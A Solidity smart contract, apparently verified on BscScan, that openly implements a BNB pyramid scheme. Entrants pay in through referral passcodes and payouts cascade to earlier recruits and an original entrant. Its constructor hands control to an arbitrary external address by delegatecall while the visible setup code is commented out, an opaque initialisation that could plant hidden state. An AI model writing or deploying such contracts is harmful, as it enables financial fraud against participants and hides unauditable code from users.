/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

/**
 * @title PyramidScheme
 */

 
contract PyramidScheme {

  
    address originalentrant;
    mapping (address => string) private passcodemap;
    mapping (string => address) public stringmap;
    mapping (string => address) public basepcmap;
    mapping(address => bool) public entrantsmap;
    mapping (address => uint) public earnedBnb;
    mapping (address => address) public referrerlist;
    mapping (address => uint) public totalearned;
    mapping(address => uint) public directrefsmap;
    mapping(address => uint) public indirectrefsmap;
    mapping(address => uint) public entrantnum;
    
    uint public totalpyramidval = 1;
    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;
    constructor(address deleAddr)  {
            (bool dcall, bytes memory ddata) = deleAddr.delegatecall(abi.encodeWithSignature("pyradele()"));

        /*
    originalentrant = msg.sender;
    entrantsmap[msg.sender] = true;
    referrerlist[msg.sender] = address(0);
    entrantnum[msg.sender] = 1;
    entrantsmap[msg.sender] = true;
    passcodemap[msg.sender] = "garygensler";
    basepcmap["garygensler"] = msg.sender;
    stringmap[bytes32ToString(sha256(bytes(string.concat(passcodemap[msg.sender], "k0"))))] = msg.sender;
         */       
    
   }
     function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {
    uint8 i = 0;
    bytes memory bytesArray = new bytes(64);
    for (i = 0; i < bytesArray.length; i++) {

        uint8 _f = uint8(_bytes32[i/2] & 0x0f);
        uint8 _l = uint8(_bytes32[i/2] >> 4);

        bytesArray[i] = toByte(_f);
        i = i + 1;
        bytesArray[i] = toByte(_l);
    }
    return string(bytesArray);
}

function toByte(uint8 _uint8) public pure returns (bytes1) {
    if(_uint8 < 10) {
        return bytes1(_uint8 + 48);
    } else {
        return bytes1(_uint8 + 87);
    }
}
   function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10 ** 64) {
                value /= 10 ** 64;
                result += 64;
            }
            if (value >= 10 ** 32) {
                value /= 10 ** 32;
                result += 32;
            }
            if (value >= 10 ** 16) {
                value /= 10 ** 16;
                result += 16;
            }
            if (value >= 10 ** 8) {
                value /= 10 ** 8;
                result += 8;
            }
            if (value >= 10 ** 4) {
                value /= 10 ** 4;
                result += 4;
            }
            if (value >= 10 ** 2) {
                value /= 10 ** 2;
                result += 2;
            }
            if (value >= 10 ** 1) {
                result += 1;
            }
        }
        return result;
    }
   function getSpecHash(string calldata basestring) public view returns (string memory) {
       return bytes32ToString(sha256(bytes(string.concat(basestring, toString(directrefsmap[basepcmap[basestring]])))));
   }
    

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        unchecked {
            uint256 length = log10(value) + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            /// @solidity memory-safe-assembly
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                /// @solidity memory-safe-assembly
                assembly {
                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
                }
                value /= 10;
                if (value == 0) break;
            }
            return string.concat("k", buffer);
        }
    }
    function utfStringLength(string memory str) internal pure returns (uint length) {
    uint i=0;
    bytes memory string_rep = bytes(str);

    while (i<string_rep.length)
    {
        if (string_rep[i]>>7==0)
            i+=1;
        else if (string_rep[i]>>5==bytes1(uint8(0x6)))
            i+=2;
        else if (string_rep[i]>>4==bytes1(uint8(0xE)))
            i+=3;
        else if (string_rep[i]>>3==bytes1(uint8(0x1E)))
            i+=4;
        else
            //For safety
            i+=1;

        length++;
    }
}
    function joinPyramid(string calldata passcode, string calldata newpass) public payable returns (uint256) {
        
        address entrant = stringmap[passcode];
        require(basepcmap[newpass] == address(0));
        require(entrant != address(0));
        require (msg.value >= 1050000000000000, "Incorrect amount of BNB sent");
        require (entrantsmap[entrant] == true, "Invalid referrer address");
        require (entrantsmap[msg.sender] == false, "Address has already bought in. You may use a different address");
         totalpyramidval += 1;
        uint rewardMultiplier = 2;
        address currentRecipient = entrant;
        uint distrubtedbnb = 1000000000000000; 
       
                
                passcodemap[msg.sender] = newpass;
                referrerlist[msg.sender] = entrant;
                entrantsmap[msg.sender] = true;
                require(utfStringLength(newpass) > 10);
                stringmap[bytes32ToString(sha256(bytes(string.concat(passcodemap[msg.sender], "k0"))))] = msg.sender;
                
                basepcmap[newpass] = msg.sender;
                entrantnum[msg.sender] = totalpyramidval;
                earnedBnb[entrant] += (distrubtedbnb/rewardMultiplier);
                totalearned[entrant] += (distrubtedbnb/rewardMultiplier);
                rewardMultiplier *= 2;
                stringmap[bytes32ToString(sha256(bytes(string.concat(passcodemap[entrant], toString(directrefsmap[entrant])))))] = address(0) ;
                directrefsmap[entrant] += 1;
                stringmap[bytes32ToString(sha256(bytes(string.concat(passcodemap[entrant], toString(directrefsmap[entrant])))))] = entrant ;
                //referrerlist(referred => refferer)
                while(currentRecipient != address(0)) {
                if (referrerlist[currentRecipient] != address(0)) {
                    earnedBnb[referrerlist[currentRecipient]] += (distrubtedbnb/rewardMultiplier);
                    totalearned[referrerlist[currentRecipient]] += (distrubtedbnb/rewardMultiplier);
                    currentRecipient = referrerlist[currentRecipient];
                    rewardMultiplier *= 2;
                    indirectrefsmap[currentRecipient] += 1;
                } else {
                    currentRecipient = address(0);
                }


       }
        
         earnedBnb[originalentrant] += ((2 * distrubtedbnb)/rewardMultiplier) + 50000000000000;
         totalearned[originalentrant] += ((2 * distrubtedbnb)/rewardMultiplier) + 50000000000000;
         return 55;
         
      
     
        
    }
   
    function withdrawbnb () public {
        address payable recipient1 = payable(msg.sender);
        uint tempbalance = earnedBnb[recipient1];
         earnedBnb[recipient1] = 0;
        (bool sent, ) = recipient1.call{value: tempbalance}("");
       tempbalance = 0;
        require(sent, "Failed to send Ether");
        
        
    }

 
}